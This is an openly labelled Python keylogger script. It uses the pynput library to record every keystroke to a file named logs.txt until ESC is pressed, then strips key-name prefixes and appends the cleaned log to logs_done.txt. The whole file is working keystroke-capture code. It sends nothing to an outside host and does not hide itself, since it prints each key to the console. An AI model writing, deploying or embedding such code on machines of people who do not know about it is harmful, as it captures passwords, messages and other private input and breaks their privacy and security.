"""
A simple keylogger that writes characters entered from the keyboard 
to a file unless the ESC key is pressed, 
then partially cleans those logs and writes them to a new file
"""

import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
	keys.append(key)
	write_file(keys)
	try:
		print('{0} pressed'.format(key.char))
	except AttributeError:
		print('{0} pressed'.format(key))
		
def write_file(keys):
	with open('logs.txt', 'w') as f:
		for key in keys:
			k = str(key).replace("'", "")
			f.write(k)
			f.write(' ')
			
def on_release(key):			
	#print('{0} released'.format(key))
	if key == Key.esc:
		return False

with Listener(on_press = on_press, on_release = on_release) as listener:
	listener.join()


#CLEAR LOGS FILE:
#----------------
def process_log(input_file_path, output_file_path):
    try:
        with open(input_file_path, 'r') as input_file:
            content = input_file.read()
            processed_content = ' '.join(word.split('.')[-1] if 'Key.' in word else word for word in content.split())
		
            with open(output_file_path, 'a') as output_file:
                output_file.write(processed_content)
            print(f"Processed content written to '{output_file_path}' successfully.")
    except FileNotFoundError:
        print("Error: One or both of the files not found.")
    except Exception as e:
        print(f"An error occurred: {e}")

with open("logs_done.txt", "a") as f:
	f.write("\n") 
	
input_file_path = 'logs.txt'
output_file_path = 'logs_done.txt'
process_log(input_file_path, output_file_path)
